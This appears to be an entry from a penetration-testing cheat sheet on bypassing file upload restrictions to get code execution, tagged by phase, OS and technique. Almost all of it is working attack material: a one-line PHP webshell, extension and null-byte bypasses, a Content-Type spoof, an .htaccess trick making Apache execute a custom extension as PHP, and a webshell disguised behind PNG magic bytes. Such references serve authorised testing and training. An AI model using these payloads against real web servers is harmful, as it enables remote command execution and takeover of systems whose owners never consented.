---
description: |
  Techniques to bypass file upload restrictions and get code execution.

  Reference values:
    Target URL: http://10.10.10.1/upload
    Attacker IP: 10.10.14.1
command: |
  # PHP webshell
  echo '<?php system($_GET["cmd"]); ?>' > shell.php

  # Extension bypasses
  # shell.php.jpg, shell.pHp, shell.php5, shell.phtml
  # shell.php%00.jpg (null byte)
  # shell.php.png (double extension)

  # Content-Type bypass (change in Burp)
  # Content-Type: image/jpeg

  # .htaccess upload (Apache)
  echo 'AddType application/x-httpd-php .xxx' > .htaccess
  # Then upload shell.xxx

  # Magic bytes — add PNG header to PHP shell
  printf '\x89\x50\x4E\x47\r\n\x1A\n' > shell.php.png
  echo '<?php system($_GET["cmd"]); ?>' >> shell.php.png

  # ASPX webshell (IIS)
  # Upload shell.aspx, shell.ashx, shell.asmx
phase:
  - Exploitation
target_os:
  - Linux
  - Windows
services:
  - HTTP
items:
  - No_Creds
techniques:
  - Web_File_Attack
network_position:
  - External
  - Internal
references:
  - https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html
---
